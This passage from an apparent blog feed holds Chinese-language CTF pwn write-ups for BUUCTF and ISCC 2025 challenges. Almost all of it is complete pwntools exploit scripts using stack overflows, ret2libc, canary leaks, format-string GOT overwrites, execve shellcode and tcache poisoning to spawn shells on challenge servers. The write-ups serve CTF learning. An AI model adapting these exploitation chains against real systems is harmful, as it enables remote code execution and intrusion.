class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt = <span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;hello,What do you want to ask?&quot;</span>,fmt)</span><br><span class="line">p.recvline()</span><br><span class="line">stack = int16(r(<span class="number">14</span>)) - <span class="number">0x90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;ok,&quot;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(r(<span class="number">3</span>),<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++--&gt;&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\x31\xf6\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#31</span></span><br><span class="line">payload = shellcode</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack)</span><br><span class="line">sa(<span class="string">b&quot;luck number&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf</title>
    <url>/2025/04/15/buuctf(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
    <content><![CDATA[<h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>题目给出ubuntu18,.且是64位程序需要考虑栈平衡</p>
<p>lambda部分省略</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">flag = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(flag)</span><br><span class="line"><span class="comment">#ru(b&#x27;please input&#x27;)</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">flag&#123;2b384cc7-6cc9-4d5e-a659-0635a86cdad5&#125;</span><br></pre></td></tr></table></figure>

<h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>ubuntu16.04，题目给出了一个地址可以<code>cat flag.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;WOW:&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(flag))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(flag)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>栈溢出修改栈上的变量，计算出两个变量的位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28132</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2c</span> + struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>) <span class="comment"># + p64(0x41348000)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>ubuntu16.04（在其他版本也行）程序将<code>I</code>替换为<code>you</code>通过<code>strcpy</code>造成了溢出，有后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding = <span class="number">20</span> <span class="comment"># 0x3c = 60; 60/3=20;</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*padding + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>



<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>ubuntu16.04 read()栈溢出有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;16a465c7-eed0-4eda-8fcb-dd5ca85ee50d&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>格式化字符串，任意地址写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路一：格式化字符串改atoi为system，第二次读入&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">1atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">p.recv()</span><br><span class="line">sl(payload)</span><br><span class="line">p.recv()</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line"><span class="comment"># 思路二：改passwd 用fmstr_payload 需要指定架构</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p32(0x0804C044)+p32(0x0804C045)+p32(0x0804C046)+p32(0x0804C047)+b&quot;%10$n%11$n%12$n%13$n&quot;</span></span><br><span class="line"><span class="comment"># 这一种改0x0804c044的随机值为0x10101010</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804c044</span>:<span class="number">0x666</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">passwd = <span class="built_in">str</span>(<span class="number">0x666</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>read()溢出，有system和&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br><span class="line">flag&#123;d935d6a8-444a-4bab-896f-32f177ac0db9&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>直接写入14个p32(17)就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,29574)</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574</span><br><span class="line">[x] Opening connection to node5.buuoj.cn on port 29574: Trying 117.21.200.176</span><br><span class="line">[+] Opening connection to node5.buuoj.cn on port 29574: Done</span><br><span class="line">&gt;&gt;&gt; payload = p32(17)*14</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>自己输入输入长度，溢出，有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x4006e6</span>))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>strlen()有<code>&#39;\0&#39;</code>截断，所以在加密函数中可以直接跳出循环，然后打ret2libc即可</p>
<p>libc版本，buu上的64位2.27</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_plt = <span class="number">0x4006e0</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">padding = <span class="number">0x50</span> + <span class="number">8</span> - <span class="number">1</span></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x4009a0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*padding + p64(ret) + p64(pop_rdi) + p64(bin_sh) +p64(system) + p64(<span class="number">0</span>) </span><br><span class="line">ru(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>C语言代码伪代码要一行一行分析，分析循环跳出的条件</p>
<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>read()栈溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26824</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4004c0</span></span><br><span class="line">bin_sh = <span class="number">0x600A90</span></span><br><span class="line">rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(rdi) + p64(bin_sh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 iscc</title>
    <url>/2025/05/21/2025iscc/</url>
    <content><![CDATA[<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="签"><a href="#签" class="headerlink" title="签"></a>签</h2><p>通过两个函数地址确定libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 09:46:21</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12400</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6-i386_2.35-0ubuntu3.8_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;--%23$p&#x27;</span></span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#--0xeb2ff800 </span></span><br><span class="line">ru(<span class="string">b&#x27;--&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08049210</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span> + p32(puts_plt) + p32(vuln) + p32(puts_got)</span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your password?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = l32()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base +  <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;++%20$p--%23$p&#x27;</span></span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">###</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">ru(<span class="string">b&quot;What&#x27;s your password?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>UAF + ret2libc 栈平衡</p>
<p>思路：</p>
<ul>
<li>将释放的chunk再申请回来，并输入flag即可进入到漏洞处</li>
<li>在第一个write处堆溢出一字节覆盖canary的\x00，使它能够被printf打印出来</li>
<li>然后正常打ret2libc，调用system需要栈平衡</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 13:39:08</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12200</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;attachment-8.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    ru(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;flag:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = <span class="number">0x40135c</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">welcome()</span><br><span class="line">ru(<span class="string">b&quot;welcome to ISCC&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x16</span> + <span class="string">b&#x27;bb&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#canary = r(7)#b&#x27;\x97\x11\xa8\xf2&lt;\xe6\xb6&#x27;</span></span><br><span class="line">canary_leak = r(<span class="number">7</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+canary_leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sl(payload)</span><br><span class="line">puts = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;welcome to ISCC&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;le0n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">ru(<span class="string">b&#x27;nice to meet you&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="《魔导王的秘密》"><a href="#《魔导王的秘密》" class="headerlink" title="《魔导王的秘密》"></a>《魔导王的秘密》</h2><p>glibc2.27</p>
<p>tcache_poisoning分配到free_hook，改free_hook为one_gadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-04 09:57:00</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12700</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">lg      = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Chant your choice:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Celestial alignment 